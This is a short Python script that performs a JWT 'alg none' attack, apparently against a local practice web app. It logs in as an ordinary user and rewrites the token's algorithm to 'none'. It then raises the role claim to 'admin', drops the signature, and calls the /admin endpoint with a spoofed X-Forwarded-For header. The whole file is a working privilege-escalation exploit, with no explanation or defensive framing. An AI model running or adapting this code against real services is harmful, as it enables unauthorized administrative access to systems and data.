import requests
import base64
import json
import sys

sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = "http://127.0.0.1:5005"

URL_LOGIN = f"{BASE_URL}/login"
URL_ADMIN = f"{BASE_URL}/admin"

USERNAME = "user1"
PASSWORD = "1234"
ATTACKER_IP = "10.15.20.05"


headers = {
    "X-Forwarded-For": ATTACKER_IP
}

data_login = {
    "username": USERNAME,
    "password": PASSWORD
}

r_login = requests.post(URL_LOGIN, data=data_login, headers=headers)
token = r_login.json()["token"]

parts = token.split(".")
header_b64 = parts[0]
payload_b64 = parts[1]
signature_b64 = parts[2]

decoded_header_bytes = base64.urlsafe_b64decode(header_b64 + "==")
decoded_header_str = decoded_header_bytes.decode()
header_dict = json.loads(decoded_header_str)
header_dict["alg"] = "none"
new_header_json = json.dumps(header_dict)
new_header_bytes = new_header_json.encode()
new_header_b64 = base64.urlsafe_b64encode(new_header_bytes).decode().rstrip("=")


decoded_payload_bytes = base64.urlsafe_b64decode(payload_b64 + "==")
decoded_payload_str = decoded_payload_bytes.decode()
payload_dict = json.loads(decoded_payload_str)
payload_dict["role"] = "admin"
new_payload_json = json.dumps(payload_dict)
new_payload_bytes = new_payload_json.encode()
new_payload_b64 = base64.urlsafe_b64encode(new_payload_bytes).decode().rstrip("=")

new_token = ".".join([new_header_b64, new_payload_b64, ""])

r_admin = requests.get(
    URL_ADMIN,
    headers={
        "Authorization": f"Bearer {new_token}",
        "X-Forwarded-For": ATTACKER_IP
    }
)
